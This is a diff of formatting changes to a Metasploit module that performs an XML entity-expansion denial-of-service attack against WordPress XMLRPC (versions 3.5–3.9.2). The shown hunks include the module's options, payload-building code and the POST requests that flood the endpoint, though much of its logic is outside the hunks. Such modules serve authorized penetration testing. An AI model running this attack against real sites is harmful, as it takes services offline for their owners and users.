@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,45 +7,45 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Wordpress XMLRPC DoS',
-      'Description'   => %q{
-        Wordpress XMLRPC parsing is vulnerable to a XML based denial of service.
-        This vulnerability affects Wordpress 3.5 - 3.9.2 (3.8.4 and 3.7.4 are
-        also patched).
-      },
-      'Author'        =>
-        [
-          'Nir Goldshlager',    # advisory
-          'Christian Mehlmauer' # metasploit module
-        ],
-      'License'       => MSF_LICENSE,
-      'References'    =>
-        [
-          ['URL', 'http://wordpress.org/news/2014/08/wordpress-3-9-2/'],
-          ['URL', 'http://www.breaksec.com/?p=6362'],
-          ['URL', 'http://mashable.com/2014/08/06/wordpress-xml-blowup-dos/'],
-          ['URL', 'https://core.trac.wordpress.org/changeset/29404'],
-          ['WPVDB', '7526']
-        ],
-      'DisclosureDate'=> 'Aug 6 2014'
-    ))
+                      'Name'          => 'Wordpress XMLRPC DoS',
+                      'Description'   => %q{
+                        Wordpress XMLRPC parsing is vulnerable to a XML based denial of service.
+                        This vulnerability affects Wordpress 3.5 - 3.9.2 (3.8.4 and 3.7.4 are
+                        also patched).
+                      },
+                      'Author'        =>
+                        [
+                          'Nir Goldshlager',    # advisory
+                          'Christian Mehlmauer' # metasploit module
+                        ],
+                      'License'       => MSF_LICENSE,
+                      'References'    =>
+                        [
+                          ['URL', 'http://wordpress.org/news/2014/08/wordpress-3-9-2/'],
+                          ['URL', 'http://www.breaksec.com/?p=6362'],
+                          ['URL', 'http://mashable.com/2014/08/06/wordpress-xml-blowup-dos/'],
+                          ['URL', 'https://core.trac.wordpress.org/changeset/29404'],
+                          ['WPVDB', '7526']
+                        ],
+                      'DisclosureDate' => 'Aug 6 2014'))
 
     register_options(
-    [
-      OptInt.new('RLIMIT', [ true, "Number of requests to send", 1000 ])
-    ], self.class)
+      [
+        OptInt.new('RLIMIT', [ true, "Number of requests to send", 1000 ])
+      ], self.class
+    )
 
     register_advanced_options(
-    [
-      OptInt.new('FINGERPRINT_STEP', [true, "The stepsize in MB when fingerprinting", 8]),
-      OptInt.new('DEFAULT_LIMIT', [true, "The default limit in MB", 8])
-    ], self.class)
+      [
+        OptInt.new('FINGERPRINT_STEP', [true, "The stepsize in MB when fingerprinting", 8]),
+        OptInt.new('DEFAULT_LIMIT', [true, "The default limit in MB", 8])
+      ], self.class
+    )
   end
 
   def rlimit
@@ -69,7 +70,7 @@ class MetasploitModule < Msf::Auxiliary
         'method'  => 'POST',
         'uri'     => wordpress_url_xmlrpc,
         'data'    => generate_xml(memory_to_use),
-        'ctype'   =>'text/xml'
+        'ctype' => 'text/xml'
       }
 
       begin
@@ -92,7 +93,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # no limit can be determined
     print_warning("can not determine limit, will use default of #{default_limit}")
-    return default_limit
+    default_limit
   end
 
   def generate_xml(size)
@@ -120,12 +121,12 @@ class MetasploitModule < Msf::Auxiliary
     xml << '</methodCall>'
 
     empty_xml = xml % {
-      :doctype => '',
-      :entity => '',
-      :entity_value => '',
-      :payload => '',
-      :param_value_1 => '',
-      :param_value_2 => ''
+      doctype: '',
+      entity: '',
+      entity_value: '',
+      payload: '',
+      param_value_1: '',
+      param_value_2: ''
     }
 
     space_to_fill = size_bytes - empty_xml.size
@@ -135,12 +136,12 @@ class MetasploitModule < Msf::Auxiliary
     entity_value_length = space_to_fill - payload.length
 
     payload_xml = xml % {
-      :doctype => doctype,
-      :entity => entity,
-      :entity_value => Rex::Text.rand_text_alpha(entity_value_length),
-      :payload => payload,
-      :param_value_1 => param_value_1,
-      :param_value_2 => param_value_2
+      doctype: doctype,
+      entity: entity,
+      entity_value: Rex::Text.rand_text_alpha(entity_value_length),
+      payload: payload,
+      param_value_1: param_value_1,
+      param_value_2: param_value_2
     }
 
     payload_xml
@@ -161,7 +162,7 @@ class MetasploitModule < Msf::Auxiliary
         'method'  => 'POST',
         'uri'     => wordpress_url_xmlrpc,
         'data'    => xml,
-        'ctype'   =>'text/xml'
+        'ctype' => 'text/xml'
       }
       begin
         c = connect
